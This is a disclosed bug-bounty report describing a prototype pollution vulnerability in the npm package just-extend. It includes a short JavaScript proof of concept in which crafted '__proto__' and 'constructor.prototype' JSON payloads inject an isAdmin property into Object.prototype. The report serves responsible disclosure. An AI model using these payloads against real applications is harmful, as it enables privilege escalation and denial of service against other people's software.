# Prototype pollution attack in just-extend

## Report Details
- **Report ID**: 430291
- **URL**: https://hackerone.com/reports/430291
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-10-29T17:03:52.159Z
- **Disclosed**: 2018-11-29T17:13:19.377Z

## Reporter
- **Username**: asgerf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a prototype pollution vulnerability in just-extend
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** just-extend
**version:** 2.1.0, and 3.0.0
**npm page:** `https://www.npmjs.com/package/just-extend`

## Module Description

Part of a library of zero-dependency npm modules that do just do one thing.
Guilt-free utilities for every occasion.

## Module Stats

723,414 downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The functions `just-extend` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` or `{__proto__: {...}}` and send it to `just-extend`.

```javascript
var extend = require('just-extend');

var payload1 = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
extend(true, {}, payload1);
console.log({}.isAdmin); // true

var payload2 = JSON.parse('{"__proto__": {"isAdmin2": true}}');
extend(true, {}, payload2);
console.log({}.isAdmin2); // true
```

# Wrap up

- I contacted the maintainer to let them know: [Y]
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Attachments
No attachments
